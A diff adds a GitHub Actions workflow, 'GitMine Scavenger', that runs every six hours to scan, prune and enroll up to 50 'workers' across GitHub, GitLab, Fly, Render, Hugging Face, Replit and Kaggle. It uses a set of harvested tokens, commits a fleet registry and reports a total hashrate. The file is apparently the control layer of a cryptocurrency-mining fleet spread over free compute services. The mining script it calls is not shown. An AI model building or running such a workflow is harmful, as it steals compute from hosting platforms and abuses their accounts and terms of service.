@@ -1,0 +1,74 @@
+name: GitMine Scavenger
+
+on:
+  schedule:
+    - cron: '0 */6 * * *'
+  workflow_dispatch:
+    inputs:
+      target_workers:
+        description: 'Target active worker count'
+        required: false
+        default: '50'
+
+jobs:
+  scavenge:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - uses: actions/setup-python@v5
+        with: {python-version: '3.11'}
+
+      - name: Install deps
+        run: |
+          pip install -q pyyaml requests gitpython pynacl \
+            playwright kaggle huggingface_hub
+          playwright install chromium --with-deps
+
+      - name: Scan + prune stale workers
+        run: python scripts/scavenger.py scan --prune-stale 2hr
+
+      - name: Enroll new workers
+        env:
+          GITHUB_TOKEN:       ${{ secrets.GITHUB_TOKEN }}
+          HARVEST_DEPLOY_KEY: ${{ secrets.HARVEST_DEPLOY_KEY }}
+          HARVEST_GH_TOKEN_0: ${{ secrets.HARVEST_GH_TOKEN_0 }}
+          HARVEST_GH_TOKEN_1: ${{ secrets.HARVEST_GH_TOKEN_1 }}
+          HARVEST_GH_TOKEN_2: ${{ secrets.HARVEST_GH_TOKEN_2 }}
+          HARVEST_GH_TOKEN_3: ${{ secrets.HARVEST_GH_TOKEN_3 }}
+          HARVEST_GH_TOKEN_4: ${{ secrets.HARVEST_GH_TOKEN_4 }}
+          GITLAB_TOKEN:       ${{ secrets.GITLAB_TOKEN }}
+          FLY_API_TOKEN:      ${{ secrets.FLY_API_TOKEN }}
+          RENDER_API_TOKEN:   ${{ secrets.RENDER_API_TOKEN }}
+          RENDER_OWNER_ID:    ${{ secrets.RENDER_OWNER_ID }}
+          HF_TOKEN:           ${{ secrets.HF_TOKEN }}
+          REPLIT_TOKEN:       ${{ secrets.REPLIT_TOKEN }}
+          KAGGLE_USERNAME:    ${{ secrets.KAGGLE_USERNAME }}
+          KAGGLE_KEY:         ${{ secrets.KAGGLE_KEY }}
+        run: |
+          python scripts/scavenger.py enroll \
+            --target-workers ${{ github.event.inputs.target_workers || '50' }}
+
+      - name: Commit registry
+        run: |
+          git config user.name  "gitmine-scavenger"
+          git config user.email "scavenger@gitmine"
+          git add fleet/harvest/
+          git diff --cached --quiet || \
+            git commit -m "scavenger: $(date -u +%Y-%m-%dT%H:%M:%SZ)" && \
+            git push origin HEAD:main
+
+      - name: Summary
+        run: |
+          python -c "
+import yaml; from pathlib import Path
+m=yaml.safe_load(Path('fleet/harvest/workers.yaml').read_text()).get('meta',{})
+print(f\"Workers : {m.get('active_count',0)} / {m.get('target_count',50)}\")
+print(f\"Hashrate: {m.get('total_hashrate_estimate','0 H/s')}\")
+"
